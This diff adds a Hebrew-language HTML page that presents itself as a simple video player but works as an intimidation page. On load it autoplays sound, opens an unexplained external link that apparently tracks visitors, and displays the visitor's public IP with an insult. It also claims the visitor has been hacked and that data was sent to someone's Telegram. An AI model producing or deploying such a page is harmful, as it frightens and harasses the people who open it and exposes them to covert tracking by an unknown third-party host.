@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="he">
+<head>
+  <meta charset="UTF-8" />
+  <title>סרטון עם סאונד ואפשרות להשתקה</title>
+  <style>
+    html, body {
+      margin: 0; padding: 0;
+      height: 100%; width: 100%;
+      background: black;
+      overflow: hidden;
+    }
+    #video {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      background: black;
+    }
+    #muteBtn {
+      position: fixed;
+      top: 0px;
+      left: 50%;
+      transform: translateX(-50%);
+      padding: 10px 20px;
+      font-size: 18px;
+      background: rgba(0,0,0,0.5);
+      border: none;
+      border-radius: 8px;
+      color: white;
+      cursor: pointer;
+      z-index: 10;
+    }
+    #ipBox {
+      position: fixed;
+      top: 80%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: black;
+      color: white;
+      padding: 20px 30px;
+      border-radius: 12px;
+      font-size: 20px;
+      font-family: Arial, sans-serif;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      z-index: 10;
+    }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay playsinline>
+    <source src="video.mp4" type="video/mp4" />
+    הדפדפן שלך לא תומך בווידאו.
+  </video>
+
+  <button id="muteBtn">אח שלנו נפרץ</button>
+  <div id="ipBox">תופסים מידע</div>
+
+  <script>
+    const video = document.getElementById('video');
+    const muteBtn = document.getElementById('muteBtn');
+    const ipBox = document.getElementById('ipBox');
+
+    video.muted = false;
+
+    function tryPlay() {
+      const playPromise = video.play();
+      if (playPromise !== undefined) {
+        playPromise.catch((err) => {
+          console.warn('ניסיון הפעלת סאונד נחסם, מפעיל מושתק');
+          video.muted = true;
+          video.play();
+          muteBtn.textContent = ".";
+        });
+      }
+    }
+
+    muteBtn.addEventListener('click', () => {
+      video.muted = !video.muted;
+      muteBtn.textContent = video.muted ? "." : ".";
+    });
+	
+	window.addEventListener('load', () => {
+      tryPlay();
+      window.open("https://screenshot.best/Q3KH16", "_blank");
+    });
+
+
+    window.addEventListener('load', () => {
+      tryPlay();
+
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          ipBox.textContent = `אייפי המסריח שלך: ${data.ip}`;
+        })
+        .catch(() => {
+          ipBox.textContent = 'הIP של כול השרת נשלח לטלגרם של פהפהפם';
+        });
+    });
+  </script>
+</body>
+</html>
